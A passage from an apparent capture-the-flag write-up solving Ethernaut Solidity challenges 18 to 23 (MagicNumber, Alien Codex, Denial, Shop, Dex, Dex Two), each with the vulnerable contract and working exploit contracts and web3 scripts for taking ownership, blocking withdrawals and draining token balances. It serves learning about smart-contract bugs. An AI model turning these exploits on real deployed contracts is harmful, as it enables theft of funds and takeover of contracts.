>   data: web3.eth.abi.encodeFunctionSignature('destroy(address)') + player.substr(2).padStart(64, '0')
> });
> ```

### 18. MagicNumber
**Challenge Source:** [18_magicnumber.sol](files/challenge_contracts/18_magicnumber.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```
> **Solution:**  
> * Our goal is to write a contract that returns 42 number when `whatIsTheMeaningOfLife()` function is called. But the length of our evm code should not exceed 10 bytes.
> * I wrote assembly code that deploys a 10 bytes of evm code that returns 42 when called. Then I converted it into hex bytecode using pyevmasm in python and then used web3js to deploy the contract.
> ```asm
> PUSH1 0xd
> JUMP
> 
> PUSH1 0x2a
> PUSH1 0x0
> MSTORE
> PUSH1 0x20
> PUSH1 0x0
> RETURN
> 
> JUMPDEST
> PUSH1 0x3
> PUSH1 0xd
> SUB
> PUSH1 0x3
> PUSH1 0x0
> CODECOPY
> PUSH1 0x3
> PUSH1 0xd
> SUB
> PUSH1 0x0
> RETURN
> ```
> ```py
> import pyevmasm
> with open('exploit.asm') as f:
>   bytecode = pyevmasm.assemble(f.read()).hex()
> print(bytecode)
> ```
> ```js
> tx = await web3.eth.sendTransaction({
>   from: player,
>   to: null,
>   data: bytecode
> });
> exp_contract_addr = tx.contractAddress;
> await contract.setSolver(exp_contract_addr);
> ```

### 19. Alien Codex
**Challenge Source:** [19_aliencodex.sol](files/challenge_contracts/19_aliencodex.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```
> **Solution:**  
> * Our goal is to claim ownership of the challenge contract.
> * First we should call make_contact() function to pass the contacted modifier check.
> * Then we have to call retract() function to make the length of codex to (2\*\*256) - 1, because the intial value of the codex length is 0 and when 1 is subtracted from 0, it is reduced to modulo 2\*\*256.
> * The solidity compiler stores the length of the codex in storage slot 1 (due to order of variable declaration) and then stores the data of the codex in linear manner starting from the hash of the index of the storage slot. If it wants to get codex\[10\], it calculates the hash of storage slot, i.e., hash(1) and then adds 10 to it, to get the key of codex\[10\].
> * If we access codex\[2\*\*256 - hash(1)\], we access the storage slot hash(1) + (2\*\*256 - hash(1)), which is equal to 2\*\*256, which is reduced to 0 due to underflow. We can use revise function to overwrite the owner address at storage slot 0.
> ```js
> await contract.make_contact();
> await contract.retract();
> index = web3.utils.encodePacked(
>   ( web3.utils.toBN('0x1' + '0'.repeat(64)) ).sub( web3.utils.toBN( web3.utils.sha3('\x01'.padStart(32, '\x00')) ) )
> );
> await contract.revise(index, '0x' + player.substr(2).padStart(64, '0'));
> ```

### 20. Denial
**Challenge Source:** [20_denial.sol](files/challenge_contracts/20_denial.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
> **Solution:**  
> * Our goal is make the contract deny the owner from withdrawing funds when withdraw() function is called.
> * To do that first we have to set our exploit contract [20_denial_attack.sol](files/solution_contracts/20_denial_attack.sol) as partner. Then whenever withdraw function is called, we will get a call to our exploit contract.
> * But irrespective of the return value, the amount is being transferred to the owner. So even if we revert when our contract is called, the owner will still get that ether.
> * Here, the gas limit for the call function is not explicitly specified, so we can use up all the gas when our exploit contract is called. Then the function call will be reverted due to Out Of Gas (OOG) error as long as our exploit contract is the partner.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract DenialAttack {
>     uint x = 0;
> 
>     fallback() external payable {
>         uint p = 0;
>         for (uint i = 0; i < (p - 1); i++) {
>             x = x + 1;
>         }
>     }
> }
> ```
> ```js
> await contract.setWithdrawPartner(exploit_contract_addr);
> ```

### 21. Shop
**Challenge Source:** [21_shop.sol](files/challenge_contracts/21_shop.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```
> **Solution:**  
> * Our goal is to make the isSold value true and price to a value less than 100.
> * This challenge is similar to [11_elevator](#11-elevator) challenge, but the difference is, the Buyer interface has the price function modifier set to view, which restricts access to modify state variables.
> * We can use call function to check the value of the isSold variable in challenge contract, and return the value in price() function accordingly.
> * Deploy the exploit contract [21_shop_attack.sol](files/solution_contracts/21_shop_attack.sol) and call the attack function with _contract parameter set to challenge contract address to complete the challenge.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> interface Shop {
>     function isSold() external view returns (bool);
> }
> 
> contract ShopAttack {
>     event Response(uint x);
> 
>     function price() external view returns (uint) {
>         Shop s = Shop(msg.sender);
>         if (s.isSold()) {
>             return 99;
>         } else {
>             return 101;
>         }
>     }
> 
>     function attack(address _contract) public {
>         (bool result, ) = _contract.call(abi.encodeWithSignature("buy()"));
>         if (result) {
>             emit Response(1111);
>         } else {
>             emit Response(2222);
>         }
>     }
> }
> ```

### 22. Dex
**Challenge Source:** [22_dex.sol](files/challenge_contracts/22_dex.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```
> **Solution:**  
> * Our goal is to drain all of at least 1 of the 2 tokens from the contract.
> * The challenge contract implements a DEX, which converts funds from one token to another token. We are given 10 tokens in each (token1 & token2) and the contract has 100 tokens each (token1 & token2).
> * After making some conversions, I observed that the token balance of contract is slowly being converted to player balance.
> * We can use this bug and drain all the tokens of challenge contract by continuously converting token1 to token2 to token1 and so on.
> ```js
> t1 = await contract.token1();
> t2 = await contract.token2();
> swap = async (from, to, amount) => {
>   if (!amount) amount = await contract.balanceOf(from, player);
>   await web3.eth.sendTransaction({
>     from: player,
>     to: from,
>     data: web3.eth.abi.encodeFunctionSignature('approve(address,uint256)') +
>           contract.address.substr(2).padStart(64, '0') +
>           web3.utils.encodePacked(amount).substr(2)
>   });
>   await contract.swap(from, to, amount);
> }
> await swap(t1, t2);
> await swap(t2, t1);
> await swap(t1, t2);
> await swap(t2, t1);
> await swap(t1, t2);
> await swap(t2, t1, 45); // Remaining balance of contract in token2
> ```

### 23. Dex Two
**Challenge Source:** [23_dex_two.sol](files/challenge_contracts/23_dex_two.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```
> **Solution:**  
> * Our goal is to drain all of the balance of challenge contract in both the tokens.
> * Unlike previous challenge, there is no from and to token address check in swap function. This allows us to give our exploit contract address as from or to token address.
> * We can pass our exploit address as from parameter and token1 address as to parameter to swap function, and set the amount parameter to 1.
> * The get_swap_amount() function returns the balance of the challenge contract in token1 contract, because we set the amount to 1 and we will return 1 in balanceOf() function of our exploit contract if the msg.sender is the challenge contract.
> * Then transferFrom() function is called on our exploit contract, which basically does nothing.
> * After that the approve() function and transferFrom() function are called which will transfer the balance of the challenge contract in token1 to the user.
> * We use the exact same method to drain the balance of token2 also.
> * Deploy the exploit contract [23_dex_two_attack.sol](files/solution_contracts/23_dex_two_attack.sol) and call the set_addr function with dex_contract address and player address set accordingly.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract DexTwoAttack {
>     address public dex_contract;
>     address public player;
>     uint256 public tmp = 0;
> 
>     function set_addr(address _dex_contract, address _player) public {
>         dex_contract = _dex_contract;
>         player = _player;
>     }
> 
>     function balanceOf(address _addr) external view returns (uint256) {
>         if (_addr == player) {
>             return 10000000000;
>         } else if (_addr == dex_contract) {
>             return 1;
>         } else {
>             return 0;
>         }
>     }
> 
>     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
>         tmp += 1;
>     }
> }
> ```
> * Then use the following js code to drain the token balances of the challenge contract.
> ```js
> t1 = await contract.token1();
> t2 = await contract.token2();
> await contract.swap(exploit_contract_addr, t1, 1);
> await contract.swap(exploit_contract_addr, t2, 1);
> ```

#### **What I've learned from playing this CTF:**
1. Basics of solidity programming language, deploying and interacting with a smart contracts.
2. The way solidity compiler uses the storage of an account and memory of a contract.
3. Basic bugs in solidity like re-entrancy, interger overflow and underflow, improper usage of delegatecall, etc.
4. ERC20 token standard.
5. The way a contract is deployed at an address (in [18.Magic Number](#18-magicnumber) challenge).

---

##### Thanks for reading! {align=center}